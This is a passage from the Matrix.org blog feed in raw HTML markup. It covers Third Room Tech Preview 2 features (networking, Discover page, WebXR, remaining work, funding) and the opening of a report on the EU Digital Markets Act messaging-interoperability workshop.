&lt;p&gt;However, at the higher levels, things are in flux. In the first Tech Preview of Third Room, we synchronised worlds using so-called peer-to-peer networking. In practice, this means that every client runs its own physics simulation of the world, and each client owns the objects which it creates - and each client sends updates about the state of its objects (position, rotation, etc) to the other members in the room, which overrides with the local view of their objects, with some smoothing, thus keeping everyone roughly in sync.  This worked well for early Third Room before we sprouted WebSG, but it has the problem that there is no single point of control when executing scripts - the world is not deterministic, and if every client executes the world’s script in parallel, they’d race badly as soon the script needs to handle users interacting with one another.&lt;&#x2F;p&gt;
&lt;p&gt;So, we’ve written a new networking engine called Authoritative Networking - which picks a given client in the room to be the authoritative simulation for the room, and executes any WebSG scripts on that client in order to get consistent results across all participants in the room.  The authoritative client is picked based on the user with the highest power level - you can think of it almost as being a bot (hosted inside someone’s browser) which executes the simulation and scripts for that world.  If that user goes offline, then the baton would be picked up by another user in the scene.  (Obviously, in an ideal world we’d have a way to execute the scripts and simulations in a byzantine-fault tolerant manner, in parallel, with minimal latency, and without any centralisation… but we’re focusing on walking before we can run :)&lt;&#x2F;p&gt;
&lt;p&gt;The current Authoritative Networking engine has some problems: we decided to synchronise simulator inputs from the scene participants to the authoritative client, rather than synchronising the physics properties of their owned objects - and this has proved difficult to script and author content around.  Therefore we’re experimenting with an alternative implementation inspired by Godot’s networking, where we synchronise object properties rather than inputs instead.&lt;&#x2F;p&gt;
&lt;p&gt;This means that right now networking is still somewhat up in the air: WebSG can execute on both the original p2p networking engine (but will be racy if user interactions collide), or the new authoritative engine (but interpolation is jumpy).  This doesn’t stop you from experimenting with networking in WebSG however - and local behaviour isn’t affected at all.  You can turn on Authoritative Networking in user settings under View Profile if you want to try.&lt;&#x2F;p&gt;
&lt;p&gt;We’re working away on sorting this out one way or another - if it was working perfectly it wouldn’t be a Tech Preview, after all ;)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;introducing-the-discover-page&quot;&gt;Introducing the Discover page&lt;&#x2F;h3&gt;
&lt;p&gt;In keeping with the focus on creators in this release, we’ve also added a new Discover view to Third Room, making it easier to find existing scenes and worlds.  A directory of curated content is published in a repository room (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ajbura&#x2F;matrix-spec-proposals&#x2F;blob&#x2F;respository-room&#x2F;proposals&#x2F;3948-repository-room.md&quot;&gt;MSC3948&lt;&#x2F;a&gt;) - by default #repository-room:thirdroom.io, and then hitting the compass icon in the side menu will let you create your own worlds based on existing scenes, or indeed discover and jump into existing worlds:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-discover.png&quot; alt=&quot;Discover&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile the Creator tab makes it even easier to get up and running creating new worlds. The Discover view now becomes the default view for new users, to help them onboard when they enter the app for the first time.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;webxr-support&quot;&gt;WebXR support&lt;&#x2F;h3&gt;
&lt;p&gt;Finally, just one more thing… Ready for your fancy new VR&#x2F;AR headset, we’re happy to announce that this update of Third Room includes WebXR support - and while it’s pretty basic (no UI overlays in XR) it actually works incredibly well, at excellent frame rates even on complex scenes.  To use it, load Third Room in the browser in your headset; enable WebXR in your profile settings, and then click the WebXR button in the bottom right group of buttons to be teleported into XR mode.&lt;&#x2F;p&gt;
&lt;p&gt;Here’s me &amp;amp; Amandine playing with it using two Quest Pros - on the left you can see my view of her in XR taken as a screenshot from my Quest Pro, showing her interacting with the air traffic simulator (with her headset, controllers and lasers superimposed as well as the map &amp;amp; plane data).  On the right you can see the same scene in plain old 3D Third Room, showing disembodied headset&#x2F;controllers (and my controller laser pointers) given we don’t have custom avatars yet.&lt;&#x2F;p&gt;
&lt;p&gt;WebXR &lt;em&gt;should&lt;&#x2F;em&gt; work out of the box on any good VR&#x2F;AR headset, without having to install any additional software or being locked into any vendor’s app store. We even expect it to work with Apple’s Vision Pro headset, based on the &lt;a href=&quot;https:&#x2F;&#x2F;webkit.org&#x2F;blog&#x2F;14205&#x2F;news-from-wwdc23-webkit-features-in-safari-17-beta&#x2F;&quot;&gt;Safari 17 release notes&lt;&#x2F;a&gt;. This is the whole promise of the open Web, and we hope Third Room will provide an amazing open environment to create XR apps and experiences in future.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;2023-06-07-webxr.jpg&quot; alt=&quot;WebXR&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-remains&quot;&gt;What remains?&lt;&#x2F;h3&gt;
&lt;p&gt;While we’ve made extraordinary progress since the last release, there’s still a bunch of things remaining which is keeping Third Room as a Technology Preview.  Most important first:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Networking
&lt;ul&gt;
&lt;li&gt;As per the Networking section above, we need to rework Authoritative Networking so we have the final networking model in place, such that WebSG scripts execute deterministically in a single place with smooth but accurate interpolation on the participating clients. We also need to iterate a bit more on the final networking API so that anyone can build multi-user apps with ease.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Persistence
&lt;ul&gt;
&lt;li&gt;While we can now edit and script scenes, the edits are only stored in the RAM of the connected clients: when all the clients from a world disconnect, the state is lost and the world resets back to its original state. Instead, we need to store the glTF changes back to the Matrix content repository on a regular basis.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Firefox performance
&lt;ul&gt;
&lt;li&gt;We’ve seen a nasty regression in the last month or two on Firefox, where SpiderMonkey (Firefox’s JavaScript engine) starts frantically garbage-collecting, despite us allocating an extremely tiny amount of memory, killing your framerate. We haven’t figured out yet whether this is our fault or Firefox’s (if someone wants to bisect old Firefox releases over the last few months we’d be very grateful!), but for now FF performance is dire in TP2.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Custom Avatars
&lt;ul&gt;
&lt;li&gt;Whilst there’s been some work on this in the community, it’s not landed yet.  There’s nothing especially hard here though (other than IK) - it’s just a matter of bandwidth.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Shadows
&lt;ul&gt;
&lt;li&gt;We have some cascaded shadow map experiments already, but we need to get it stable and on by default for scenes which would benefit (e.g. the basketball tutorial!)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Mobile web
&lt;ul&gt;
&lt;li&gt;Similarly, support for mobile web would be really nice for those dipping their toe in the water - and given the performance we’re seeing on Android-based XR headsets like the Quest, the performance on mobile web should be sensational.  Again, it’s just a matter of time to sort it out.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Fully-fledged editor
&lt;ul&gt;
&lt;li&gt;The current editor is effectively just an inspector; it’s great for visualising the glTF scene, but you can’t really go and start changing the fabric of reality yet. An editor isn’t an editor without some fancy 3D gizmos to help you grab and manipulate the world - so for all our in-world direct manipulation Inception dreams to come true, the devtools need a bit more work.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Content!
&lt;ul&gt;
&lt;li&gt;Finally, last but not least, we need to start populating these worlds with some fun, beautiful, amazing apps and games.  The whole point of this release is to give creators the tools they need to start properly playing around, building on top of Third Room, and we really hope you’ll give it a go and get involved (not least as our bandwidth to do so within the core team is sorely limited).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Hopefully the next release will be both the final tech preview and the first beta of the complete Third Room experience - but to get there, we need your feedback: please head over to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#thirdroom-dev:matrix.org&quot;&gt;#thirdroom-dev:matrix.org&lt;&#x2F;a&gt; and tell us what you think!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;funding-third-room&quot;&gt;Funding Third Room&lt;&#x2F;h3&gt;
&lt;p&gt;If you’ve read this far, you must surely be pretty interested in Third Room, and hopefully agree that having an open platform for building spatial apps and virtual worlds is absolutely critical for the health and future of the Internet - especially as the VR&#x2F;AR&#x2F;3D space slowly but surely gathers momentum as new players and hardware materialise.&lt;&#x2F;p&gt;
&lt;p&gt;However, funding the team to work full-time on Third Room is increasingly challenging - the macroeconomic environment does not lend itself to moonshot R&amp;amp;D projects, and Matrix as a whole continues to suffer from &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-update-2022&quot;&gt;insufficient financial support&lt;&#x2F;a&gt; (quite aside from Third Room).  This is particularly frustrating given the massive range of obvious commercial applications for Third Room - whether that’s for building digital twins, situational awareness, telepresence, gaming, providing an open platform to glue together real-time 3D data from other existing data feeds, etc.&lt;&#x2F;p&gt;
&lt;p&gt;To try to spell out the opportunities and why it clearly makes sense for commercial players to invest in supporting Third Room development, we recently put together a quick enterprise demo reel (which also serves to demo everything mentioned above, albeit in a more businessy manner than normal). &lt;strong&gt;If this resonates and your organisation is interested in funding Third Room - please contact &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;funding@matrix.org&lt;&#x2F;a&gt; asap.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;iframe width=&quot;1280&quot; height=&quot;720&quot; src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;cFKJ-IuGaKA&quot; title=&quot;Third Room Enterprise Demo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;Otherwise, we hope you enjoy the new update - and please let us know how you get on with it!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Robert, Nate &amp;amp; Ajay&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The DMA Stakeholder Workshop: Interoperability between messaging services</title>
        <published>2023-03-15T00:00:00+00:00</published>
        <updated>2023-03-15T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2023/03/15/the-dma-stakeholder-workshop-interoperability-between-messaging-services/" type="text/html"/>
        <id>https://matrix.org/blog/2023/03/15/the-dma-stakeholder-workshop-interoperability-between-messaging-services/</id>
        
        <content type="html">&lt;p&gt;A few weeks ago we found ourselves in Brussels to participate in the second &lt;a href=&quot;https:&#x2F;&#x2F;competition-policy.ec.europa.eu&#x2F;dma&#x2F;dma-workshops_en&quot;&gt;stakeholder workshop for the Digital Markets Act (DMA)&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;commission.europa.eu&#x2F;strategy-and-policy&#x2F;priorities-2019-2024&#x2F;europe-fit-digital-age&#x2F;digital-markets-act-ensuring-fair-and-open-digital-markets_en&quot;&gt;DMA&lt;&#x2F;a&gt; is new antitrust&#x2F;competition regulation from Europe which came into force in November, whose objective is to make digital markets more competitive by forcing gatekeepers (i.e. large tech companies) to reconsider some of their anti-competitive or self-preferencing practices. Gatekeepers are defined as companies which have a clear position of influence in a given market (based on revenue &#x2F; market cap &#x2F; number of users thresholds), and “an entrenched and durable position”. The process for designating which companies count as gatekeepers will start in May 2023.&lt;&#x2F;p&gt;
&lt;p&gt;The DMA touches upon different key topics, from self-preferencing behaviour to app store management practices - but most importantly includes interoperability for “number-independent interpersonal communication services” (NIICS), otherwise known as chat and voice&#x2F;video calling and conferencing services (social media was left out for now). &lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;competition-policy.ec.europa.eu&#x2F;dma&#x2F;dma-workshops&#x2F;interoperability-workshop_en&quot;&gt;This particular workshop&lt;&#x2F;a&gt; was focused on the latter: interoperability between messaging services, with the aim of getting the different stakeholders of the industry in the same place to discuss how the legislation could be implemented.  The whole idea is to figure out a practical way in which WhatsApp could interoperate with iMessage, Google Messages and others, creating an interoperable communication network where users are no longer locked into communication silos and pick their preferred service provider without compromising on who they can talk to. &lt;&#x2F;p&gt;
&lt;p&gt;About 900 people participated online, and around 80 people were present in person: the maximum the room could hold. It was particularly fun to see representatives from the whole industry turning up in person, including folks from XMPP, MIMI (the new IETF working group on messaging interoperability), MLS, us from Matrix obviously (alongside Matrix ecosystem representatives from Beeper and NeoChat!) - all together with the Body of European Regulators for Electronic Communications (&lt;a href=&quot;https:&#x2F;&#x2F;www.berec.europa.eu&#x2F;en&#x2F;berec&#x2F;what-is-berec&quot;&gt;BEREC&lt;&#x2F;a&gt;), civil society representatives (like the Federation of German Consumer Organisations (&lt;a href=&quot;https:&#x2F;&#x2F;VZBV.de&quot;&gt;VZBV&lt;&#x2F;a&gt;) and European Digital Rights (&lt;a href=&quot;https:&#x2F;&#x2F;edri.org&quot;&gt;EDRi&lt;&#x2F;a&gt;)), mobile network operators, local network agencies, and obviously some of those who are likely to be designated as gatekeepers, such as Meta, Apple and Google.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;so-what-was-discussed&quot;&gt;So what was discussed?&lt;&#x2F;h2&gt;
&lt;p&gt;All of the workshop proceeds were livestreamed and archived by European Commission’s &lt;a href=&quot;https:&#x2F;&#x2F;webcast.ec.europa.eu&#x2F;dma-workshop-2023-02-27&quot;&gt;webcasting service&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;commission.europa.eu&#x2F;legal-notice_en#copyright-notice&quot;&gt;released&lt;&#x2F;a&gt; under the terms of the Creative Commons Attribution 4.0 International (CC BY 4.0) licence, so we’ve taken the liberty of republishing them split up into chapters so that folks can quickly refer to the discussion.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;panel-1-introduction-to-horizontal-interoperability-between-messaging-services-goals-challenges-and-potential-solutions&quot;&gt;Panel 1: Introduction to horizontal interoperability between messaging services: goals, challenges and potential solutions&lt;&#x2F;h3&gt;
&lt;p&gt;The first panel focused on setting up the scene and highlighting the challenges expected during the implementation phase, featuring &lt;a href=&quot;https:&#x2F;&#x2F;www.soi.unitn.it&#x2F;staff&#x2F;simonetta-vezzoso&#x2F;&quot;&gt;Simonetta Vezzoso&lt;&#x2F;a&gt; (Professor of Economics at The University of Trento), &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;chiaracaccinelli&quot;&gt;Chiara Caccinelli&lt;&#x2F;a&gt; (Co-chair - Digital Markets WG at &lt;a href=&quot;https:&#x2F;&#x2F;www.berec.europa.eu&#x2F;&quot;&gt;BEREC&lt;&#x2F;a&gt;), &lt;a href=&quot;https:&#x2F;&#x2F;www.vzbv.de&#x2F;en&#x2F;policy-work&#x2F;experts&quot;&gt;Suzanne Blohm&lt;&#x2F;a&gt; (Policy officer at &lt;a href=&quot;https:&#x2F;&#x2F;www.vzbv.de&#x2F;&quot;&gt;Verbraucherzentrale Bundesverbands (VZBV)&lt;&#x2F;a&gt;) and &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;jan-penfrat&quot;&gt;Jan Penfrat&lt;&#x2F;a&gt; (Senior Policy Advisor at &lt;a href=&quot;https:&#x2F;&#x2F;edri.org&#x2F;&quot;&gt;EDRi&lt;&#x2F;a&gt;). There was a lot of emphasis around the risks of gatekeepers dragging their feet, or choosing the solution which makes it harder for SMEs or self-hosters to interoperate, as well as the challenge of introducing the new paradigm of interoperability for messaging without losing the usability aspect - see below for the full scope:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;yoKjXN3G8a8&quot; title=&quot;DMA &amp;amp; messaging services interoperability - Legal framework of article 7, tradeoff &amp;amp; challenges&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=0s&quot;&gt;00:00&lt;&#x2F;a&gt; Welcome to the second DMA stakeholder workshop about interoperability between messaging services&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=483s&quot;&gt;08:03&lt;&#x2F;a&gt; Introduction of the panelists&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=566s&quot;&gt;09:26&lt;&#x2F;a&gt; What is the Article 7 of the Digital Markets Act (Simonetta Vezzoso)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=1595s&quot;&gt;26:35&lt;&#x2F;a&gt; Interoperability already exists in the EU, what can we learn from it (Chiara Caccinelli)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=2443s&quot;&gt;40:43&lt;&#x2F;a&gt; End user perspective and behaviour, benefits of the DMA Article 7, Challenges (Suzanne Blohm)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=2970s&quot;&gt;49:30&lt;&#x2F;a&gt; Benefits for end users, and an existing technical stack to build from (Jan Penfrat)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=3561s&quot;&gt;59:21&lt;&#x2F;a&gt; What the UI could look like (Jan Penfrat)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=3787s&quot;&gt;01:03:07&lt;&#x2F;a&gt; Question - Do users need an account on each network, or is it a true federation? (XMPP Foundation)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=3919s&quot;&gt;01:05:19&lt;&#x2F;a&gt; Question - What rule do you see for Telcos and for messaging services they provide?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=4207s&quot;&gt;01:10:07&lt;&#x2F;a&gt; Question - Does the term &amp;quot;user&amp;quot; include people running their own server&#x2F;service? (Open Source Initiative)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=4490s&quot;&gt;01:14:50&lt;&#x2F;a&gt; Question - How to check the gatekeeper is not giving a suboptimal solution? (online question)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=4684s&quot;&gt;01:18:04&lt;&#x2F;a&gt; Question - Does user consent limit the power of Article 7? (Viber)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=4956s&quot;&gt;01:22:36&lt;&#x2F;a&gt; Question - Gatekeepers don&#x27;t have an incentive to make appealing UIs for interoperability and might try to scare users away. Will it be addressed? (NLNet)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5048s&quot;&gt;01:24:08&lt;&#x2F;a&gt; Question - People usually dislike popups, how to strike the balance between warning and upsetting them? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5271s&quot;&gt;01:27:51&lt;&#x2F;a&gt; Question - Have you been thinking about reputation models?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5393s&quot;&gt;01:29:53&lt;&#x2F;a&gt; Question - Different apps use different E2EE protocols to differentiate. Could article 7 kill that differentiation? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5928s&quot;&gt;01:38:48&lt;&#x2F;a&gt; Question - What will be the paradigm of non discrimination?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5590s&quot;&gt;01:33:10&lt;&#x2F;a&gt; Question - What about interoperability of RCS and Apple iMessage? (Orange)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5684s&quot;&gt;01:34:44&lt;&#x2F;a&gt; Question - Do you take into account that there are not only company-run services, but also Open Source components? (Process One)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5755s&quot;&gt;01:35:55&lt;&#x2F;a&gt; Question - What are the implications for non European users? (Beeper)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=5965s&quot;&gt;01:39:25&lt;&#x2F;a&gt; Question - Does the DMA only mandate interoperability for European users, even on a same platform? (XMPP)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6036s&quot;&gt;01:40:36&lt;&#x2F;a&gt; Question - Will the interoperability be opt-in or opt-out? (Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6110s&quot;&gt;01:41:50&lt;&#x2F;a&gt; Question - How avoid the standardisation to be taken over by commercial interests? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6223s&quot;&gt;01:43:43&lt;&#x2F;a&gt; Question - What will the timing look like for the DMA? (Cisco)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6493s&quot;&gt;01:48:13&lt;&#x2F;a&gt; Question - What could be reasonable requirements for smaller services? (online)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6540s&quot;&gt;01:49:00&lt;&#x2F;a&gt; Question - Where should gatekeeper gather to start discussion how interoperability will look like in practice? (OpenXchange)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6671s&quot;&gt;01:51:11&lt;&#x2F;a&gt; Question - What about account portability, for users switching from one platform to another? (University of Rome)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6893s&quot;&gt;01:54:53&lt;&#x2F;a&gt; Question - Is contact information part of the data gatekeepers need to share? (XMPP)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=yoKjXN3G8a8&amp;amp;t=6972s&quot;&gt;01:56:12&lt;&#x2F;a&gt; Closing&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;panel-2-exploring-the-technical-aspects-of-interoperability-part-1-end-to-end-encryption-security-of-the-service&quot;&gt;Panel 2: Exploring the technical aspects of interoperability (Part 1): end-to-end encryption, security of the service&lt;&#x2F;h3&gt;
&lt;p&gt;Then, after a quick lunch, the second panel went into the nitty gritty of how end-to-end encrypted interoperable messaging (1:1 messaging is the first milestone to be delivered, hence the focus) could actually be implemented by the gatekeepers. The panel starred &lt;a href=&quot;https:&#x2F;&#x2F;www.roeslpa.de&#x2F;&quot;&gt;Paul Rösler&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;fau.de&#x2F;&quot;&gt;FAU Erlangen-Nürnberg&lt;&#x2F;a&gt;, who gave a great overview of end-to-end encryption in general, &lt;a href=&quot;https:&#x2F;&#x2F;alissacooper.com&#x2F;&quot;&gt;Alissa Cooper&lt;&#x2F;a&gt; from Cisco who explained the merits of open interoperable protocols, &lt;a href=&quot;https:&#x2F;&#x2F;educatedguesswork.org&#x2F;about&#x2F;&quot;&gt;Eric Rescorla&lt;&#x2F;a&gt; from Mozilla explaining the merits of standardisation, yours truly from Matrix explaining and demonstrating how one can actually use a standardised open protocol to interoperate without sacrificing privacy (effectively fleshing out our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&quot;&gt;blog&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;25&#x2F;interoperability-without-sacrificing-privacy-matrix-and-the-dma&quot;&gt;posts&lt;&#x2F;a&gt; from last year) and then finally &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;stephen-hurley-24424231&quot;&gt;Stephen Hurley&lt;&#x2F;a&gt; from Meta to explain how they are thinking about DMA obligations.&lt;&#x2F;p&gt;
&lt;p&gt;The panel ended up being a relatively exciting tour through the landscape of DMA practicalities, and it was a lot of fun to actually &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=3715s&quot;&gt;demonstrate a minimum viable prototype of client-side bridging&lt;&#x2F;a&gt; thanks to Travis’s work packaging up standalone client-side bridges for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dma-demo-app-bridge-whatsapp&quot;&gt;WhatsApp&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dma-demo-app-bridge-googlechat&quot;&gt;Google Chat&lt;&#x2F;a&gt; (strictly for demonstration illustrative purposes only). The slides (and demo) were sadly a bit fuzzy on the recording, but you can see our slides below and grab everyone’s presentations from the &lt;a href=&quot;https:&#x2F;&#x2F;competition-policy.ec.europa.eu&#x2F;document&#x2F;download&#x2F;c59e04bc-f96c-49d9-b161-ad9c24d82367_en?filename=20230227_dma_stakeholders_workshop_panelists_material_0.zip&quot;&gt;European Commission website&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
&lt;iframe width=&quot;1280&quot; height=&quot;720&quot; src=&quot;&#x2F;blog&#x2F;img&#x2F;matrix-dma-slides.pdf&quot;&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;p&gt;When DMA first became headline news last year, there was a lot of &lt;a href=&quot;https:&#x2F;&#x2F;www.theverge.com&#x2F;2022&#x2F;3&#x2F;28&#x2F;23000148&#x2F;eu-dma-damage-whatsapp-encryption-privacy&quot;&gt;very vocal concern&lt;&#x2F;a&gt; that it would somehow end up undermining end-to-end encryption (despite the legislation explicitly requiring that E2EE must be preserved when interoperating). Hopefully this session demonstrated that both the European Commission and the various panellists are dead serious about achieving interoperability without sacrificing privacy - whether that’s via the brute-force approach of client-side bridges, or the more sophisticated approach of client-side bridges which bridge to client-side APIs, or by incrementally or entirely adopting a true open standard protocol like Matrix, XMPP, or whatever MIMI comes up with.&lt;&#x2F;p&gt;
&lt;p&gt;You can see the whole panel split into the various sections below:&lt;&#x2F;p&gt;
&lt;iframe  src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;FDnUJXzVn3s&quot; title=&quot;DMA &amp;amp; messaging services interoperability - End to end Encryption and Security&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;br&#x2F;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=FDnUJXzVn3s&amp;amp;t=0s&quot;&gt;00:00&lt;&#x2F;a&gt; Opening&lt;&#x2F;li&gt;
